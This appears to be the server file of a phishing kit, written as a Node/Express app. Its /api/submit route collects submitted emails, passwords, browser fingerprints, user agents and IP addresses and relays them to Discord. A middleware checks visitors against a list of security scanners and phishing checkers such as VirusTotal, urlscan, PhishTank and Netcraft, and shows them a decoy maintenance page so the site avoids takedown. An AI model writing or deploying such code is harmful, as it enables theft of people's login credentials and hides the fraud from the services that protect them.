import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

import { submitToDiscord } from "./functions/discord";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Bot detection middleware
  const botUserAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 
    'exabot', 'mj12bot', 'facebot', 'facebookexternalhit', 'ia_archiver',
    'virustotal', 'urlscan', 'phishtank', 'netcraft', 'cybercrime',
    'security', 'scanner', 'headless', 'puppeteer', 'selenium',
    'playwright', 'zgrab', 'censys', 'shodan', 'nmap', 'sqlmap',
    'nikto', 'burp', 'acunetix', 'netsparker', 'qualys', 'nessus'
  ];

  app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const referer = req.headers['referer']?.toLowerCase() || '';
    
    // Check for common security scanner headers or referers
    const isSecurityScanner = 
      botUserAgents.some(bot => ua.includes(bot)) ||
      referer.includes('virustotal') || 
      referer.includes('urlscan') ||
      referer.includes('phishtank') ||
      req.headers['x-scanner'] ||
      req.headers['x-request-id']?.toString().includes('scanner');

    if (isSecurityScanner) {
      // Serve a generic maintenance page for bots and scanners
      return res.status(503).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>System Maintenance</title>
          <meta name="robots" content="noindex, nofollow">
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; padding: 100px 20px; background: #f9f9f9; color: #444; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid #eee; }
            h1 { font-size: 24px; color: #333; margin-bottom: 20px; }
            p { font-size: 16px; line-height: 1.6; color: #666; }
            .code { font-family: monospace; background: #eee; padding: 2px 6px; border-radius: 4px; font-size: 14px; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>System Maintenance</h1>
            <p>Our systems are currently undergoing scheduled maintenance to improve performance and security.</p>
            <p>We expect to be back online shortly. Thank you for your patience.</p>
            <p style="margin-top: 30px; font-size: 12px; color: #999;">Error Reference: <span class="code">MAINT-${Math.floor(Math.random() * 1000000).toString(16).toUpperCase()}</span></p>
          </div>
        </body>
        </html>
      `);
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  app.post("/api/submit", async (req, res) => {
    const { email, password, fingerprint, theme } = req.body;
    const userAgent = req.headers['user-agent'] || "N/A";
    const ip = req.ip || "N/A";

    try {
      const result = await submitToDiscord(email, password, fingerprint, theme, userAgent, ip);
      res.json(result);
    } catch (error) {
      console.error("Error submitting to Discord:", error);
      res.status(500).json({ error: "Failed to submit" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    app.use(express.static(path.join(__dirname, "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "dist", "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
